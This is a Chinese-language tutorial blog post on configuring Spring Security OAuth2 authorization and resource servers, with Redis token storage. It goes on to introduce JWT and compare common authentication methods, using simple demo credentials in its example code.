<h3 id="客户端模式"><a href="#客户端模式" class="headerlink" title="客户端模式"></a>客户端模式</h3><p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200507877.png" alt="image-20201208200507877"></p>
<h2 id="Spring-Security-Oauth2"><a href="#Spring-Security-Oauth2" class="headerlink" title="Spring Security Oauth2"></a>Spring Security Oauth2</h2><p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200639973.png" alt="image-20201208200639973"></p>
<ul>
<li>Authorize Endpoint ：授权端点，进行授权</li>
<li>Token Endpoint ：令牌端点，经过授权拿到对应的Token </li>
<li>Introspection Endpoint ：校验端点，校验Token合法性 </li>
<li>Revocation Endpoint ：撤销端点，撤销授权</li>
</ul>
<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200755354.png" alt="image-20201208200755354"></p>
<p>流程</p>
<ul>
<li>用户访问,此时没有Token。<code>Oauth2RestTemplate</code>会报错，这个报错信息会被 <code>Oauth2ClientContextFilter</code>捕获并重定向到认证服务器 </li>
<li>认证服务器通过Authorization Endpoint进行授权，并通过<code>AuthorizationServerTokenServices</code>生 成授权码并返回给客户端 </li>
<li>客户端拿到授权码去认证服务器通过Token Endpoint调用<code>AuthorizationServerTokenServices</code>生 成Token并返回给客户端 </li>
<li>客户端拿到Token去资源服务器访问资源，一般会通过Oauth2AuthenticationManager调用 <code>ResourceServerTokenServices</code>进行校验。校验通过可以获取资源。</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">		 <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="tag"><span class="string">https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>spring-security-oauth2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">spring-cloud.version</span>&gt;</span>Greenwich.SR2<span class="tag">&lt;/<span class="name">spring-cloud.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-oauth2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pojo</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">UserDetails</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 权限集合</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;GrantedAuthority&gt; authorities;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserDetailsService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PasswordEncoder passwordEncoder;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDetails <span class="title">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        String password = passwordEncoder.encode(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(username,password,</span><br><span class="line">                AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getCurrentUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getCurrentUser</span><span class="params">(Authentication authentication)</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取对象</span></span><br><span class="line">        <span class="keyword">return</span> authentication.getPrincipal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecurityConfig</span> <span class="keyword">extends</span> <span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PasswordEncoder <span class="title">getpw</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SCryptPasswordEncoder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//认证</span></span><br><span class="line">        http.formLogin().permitAll();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//授权</span></span><br><span class="line">        http.authorizeRequests()</span><br><span class="line">                .antMatchers(<span class="string">&quot;/oauth/**&quot;</span>,<span class="string">&quot;/login/**&quot;</span>,<span class="string">&quot;/logout/**&quot;</span>)</span><br><span class="line">                .permitAll()</span><br><span class="line">                .anyRequest()</span><br><span class="line">                .authenticated();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭csrf</span></span><br><span class="line">        http.csrf().disable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     授权服务器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAuthorizationServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthorizationServerConfig</span> <span class="keyword">extends</span> <span class="title">AuthorizationServerConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(ClientDetailsServiceConfigurer clients)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//内存内</span></span><br><span class="line">        clients.inMemory()</span><br><span class="line">                <span class="comment">//客户端id</span></span><br><span class="line">                .withClient(<span class="string">&quot;client&quot;</span>)</span><br><span class="line">                <span class="comment">//密钥</span></span><br><span class="line">                .secret(<span class="string">&quot;12345&quot;</span>)</span><br><span class="line">                .redirectUris(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">                <span class="comment">//授权范围</span></span><br><span class="line">                .scopes(<span class="string">&quot;all&quot;</span>)</span><br><span class="line">                <span class="comment">//授权类型</span></span><br><span class="line">                <span class="comment">//authorization_code;授权码模式</span></span><br><span class="line">                .authorizedGrantTypes(<span class="string">&quot;authorization_code&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 资源服务器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableResourceServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceServerConfig</span> <span class="keyword">extends</span> <span class="title">ResourceServerConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        http.authorizeRequests()</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">                .and()</span><br><span class="line">                .requestMatchers()</span><br><span class="line">                <span class="comment">//获取资源controller,对controller中url地址放行</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/user/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="授权码模式-1"><a href="#授权码模式-1" class="headerlink" title="授权码模式"></a>授权码模式</h3><h4 id="获取授权码"><a href="#获取授权码" class="headerlink" title="获取授权码"></a>获取授权码</h4><p> <a href="http://localhost:8087/oauth/authorize?response_type=code&amp;client_id=client&amp;redirect_uri=http://www.baidu.com&amp;scope=all">http://localhost:8087/oauth/authorize?response_type=code&amp;client_id=client&amp;redirect_uri=http://www.baidu.com&amp;scope=all</a></p>
<ul>
<li>输入账号密码(Service层中的)</li>
<li>得到授权码</li>
</ul>
<p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208235539296.png" alt="image-20201208235539296"></p>
<h4 id="根据授权码获得令牌token"><a href="#根据授权码获得令牌token" class="headerlink" title="根据授权码获得令牌token"></a>根据授权码获得令牌token</h4><ul>
<li>客户端得到授权码去授权服务器获取token</li>
<li>postman模拟客户端发送json给授权服务器得到token的过程</li>
<li>拿到token到资源服务器获得资源</li>
</ul>
<p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201209001422681.png" alt="image-20201209001422681"></p>
<ul>
<li><p>grant_type ：授权类型，填写authorization_code，表示授权码模式 </p>
</li>
<li><p>code ：授权码，就是刚刚获取的授权码，注意：授权码只使用一次就无效了，需要重新申请。 </p>
</li>
<li><p>client_id :客户端标识 </p>
</li>
<li><p>redirect_uri ：申请授权码时的跳转url，一定<strong>和申请授权码时用的redirect_uri一致</strong>。 scope :授权范围。 </p>
</li>
</ul>
<p>  认证失败服务端返回 401 Unauthorized </p>
<p>  注意：此时无法请求到令牌，访问服务器会报错</p>
<p><img src="https://csn.damyoung.cn/image-20201209001725743.png" alt="image-20201209001725743"></p>
<p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201209001536525.png" alt="image-20201209001536525"></p>
<h4 id="根据token去资源服务器拿资源"><a href="#根据token去资源服务器拿资源" class="headerlink" title="根据token去资源服务器拿资源"></a>根据token去资源服务器拿资源</h4><p><img src="https://csn.damyoung.cn/image-20201209001632930.png" alt="image-20201209001632930"></p>
<p><img src="https://csn.damyoung.cn/image-20201209001648630.png" alt="image-20201209001648630"></p>
<h3 id="密码模式-1"><a href="#密码模式-1" class="headerlink" title="密码模式"></a>密码模式</h3><ul>
<li>客户端直接将账户密码传给授权服务器获得token</li>
</ul>
<p>在原有授权码模式基础上(更改授权服务器)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 密码模式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> endpoints</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(AuthorizationServerEndpointsConfigurer endpoints)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    endpoints.authenticationManager(authenticationManager)</span><br><span class="line">            .userDetailsService(userService);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201209095813235.png" alt="image-20201209095813235"></p>
<p><img src="https://csn.damyoung.cn/image-20201209100313845.png" alt="image-20201209100313845"></p>
<p><img src="https://csn.damyoung.cn/image-20201209100326800.png" alt="image-20201209100326800"></p>
<p><img src="https://csn.damyoung.cn/image-20201209100340902.png" alt="image-20201209100340902"> </p>
<h3 id="Redis存储token"><a href="#Redis存储token" class="headerlink" title="Redis存储token"></a>Redis存储token</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    redis依赖 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--      对象池依赖--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Redis配置</span></span><br><span class="line"><span class="meta">spring.redis.host</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="meta">spring.redis.database</span>=<span class="string">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#本机端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">8085</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisConnectionFactory redisConnectionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TokenStore <span class="title">redisTokenStore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RedisTokenStore(redisConnectionFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 密码模式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> endpoints</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(AuthorizationServerEndpointsConfigurer endpoints)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    endpoints.authenticationManager(authenticationManager)</span><br><span class="line">            .userDetailsService(userService)</span><br><span class="line">            .tokenStore(tokenStore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="常见认证方式"><a href="#常见认证方式" class="headerlink" title="常见认证方式"></a>常见认证方式</h2><h3 id="HTTP-Basic-Auth"><a href="#HTTP-Basic-Auth" class="headerlink" title="HTTP Basic Auth"></a>HTTP Basic Auth</h3><p> HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之， Basic Auth是配合RESTful API 使用的最简单的认证方式，<strong>只需提供用户名密码即可</strong>，但由于有把用户 名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的 RESTful API时，尽量避免采用HTTP Basic Auth。 </p>
<h3 id="Cookie-Auth"><a href="#Cookie-Auth" class="headerlink" title="Cookie Auth"></a>Cookie Auth</h3><p>Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建 了一个Cookie对象；通过客户端带上来<strong>Cookie对象来与服务器端的session对象匹配</strong>来实现状态管理 的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使 cookie在一定时间内有效。  </p>
<p><img src="https://csn.damyoung.cn/image-20201209105809552.png" alt="image-20201209105809552"></p>
<h3 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h3><p>OAuth（开放授权,Open Authorization）是一个开放的授权标准，允许用户让第三方应用访问该用 户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给 第三方应用。如网站通过微信、微博登录等，主要用于第三方登录。 OAuth允许用户提供一个<strong>令牌</strong>，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一 个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内 访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们 存储在另外服务提供者的某些特定信息，而非所有内容。 </p>
<p>这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合 拥有自有认证权限管理的企业应用。 </p>
<p>缺点：过重，完整环境下需要授权服务器，资源服务器。 </p>
<p><img src="https://csn.damyoung.cn/image-20201209105757493.png" alt="image-20201209105757493"></p>
<h3 id="Token-Auth"><a href="#Token-Auth" class="headerlink" title="Token Auth"></a>Token Auth</h3><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。</p>
<ol>
<li><p>客户端使用用户名跟密码请求登录 </p>
</li>
<li><p>服务端收到请求，去验证用户名与密码 </p>
</li>
<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端 </p>
</li>
<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里 </p>
</li>
<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token </p>
</li>
<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请 求的数据 </p>
<p>比第一种方式更安全，比第二种方式更节约服务器资源(token字符串，cookie对象)，比第三种方式更加轻量。 </p>
</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20201209105741458.png" alt="image-20201209105741458"></p>
<p>具体，Token Auth的优点（Token机制相对于Cookie机制又有什么好处呢？）： </p>
<ol>
<li>支持跨域访问: Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户 认证信息(token)通过HTTP头传输. </li>
<li>无状态(也称：服务端可扩展行):Token机制在服务端不需要存储session信息，因为Token 自身包 含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息. </li>
<li>更适用CDN: 可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML,图片 等），而你的服务端只要提供API即可.</li>
<li>去耦: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用 的时候，你可以进行Token生成调用即可. </li>
<li>更适用于移动应用: 当你的客户端是一个原生平台（iOS, Android，Windows 10等）时，Cookie 是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。 </li>
<li>CSRF:因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范。 </li>
<li> 性能: 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算的Token 验证和解析要费时得多. </li>
<li>不需要为登录页面做特殊处理: 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做 特殊处理.</li>
<li>基于标准化:你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库 （.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）.</li>
</ol>
<h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><p>JSON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简介的、自包含的<strong>协议格式</strong>，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。JWT可以使用 HMAC算法或使用RSA的公钥/私钥对来签名，防止被篡改。</p>
<p>JWT令牌的优点： </p>
<ol>
<li>jwt基于json，非常方便解析。 </li>
<li>可以在令牌中自定义丰富的内容，易扩展。 </li>
<li>通过非对称加密算法及数字签名技术，JWT防止篡改，安全性高。</li>
<li>资源服务使用JWT可不依赖认证服务即可完成授权。 </li>
</ol>
<p>缺点： JWT令牌较长，占存储空间比较大。</p>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。</p>
<h3 id="头部header"><a href="#头部header" class="headerlink" title="头部header"></a>头部header</h3><p>头部用于描述关于该JWT的最基本的信息，例如其类型（即JWT）以及签名所用的算法（如HMAC SHA256或RSA）等。这也可以被表示成一个JSON对象。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">	<span class="comment">//签名的算法，HS256算法</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>, </span><br><span class="line">    <span class="comment">//类型</span></span><br><span class="line">	 <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>	</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="负载payload"><a href="#负载payload" class="headerlink" title="负载payload"></a>负载payload</h3><p>存放有效信息的地方</p>
<p>iss: jwt签发者 </p>
<p>sub: jwt所面向的用户 </p>
<p>aud: 接收jwt的一方 </p>
<p>exp: jwt的过期时间，这个过期时间必须要大于签发时间 </p>
<p>nbf: 定义在什么时间之前，该jwt都是不可用的. </p>
<p>iat: jwt的签发时间 </p>
<p>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</p>
<ul>
<li>公共的声明 </li>
</ul>
<p>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加 敏感信息，因为该部分在客户端可解密. </p>
<ul>
<li>私有的声明 </li>
</ul>
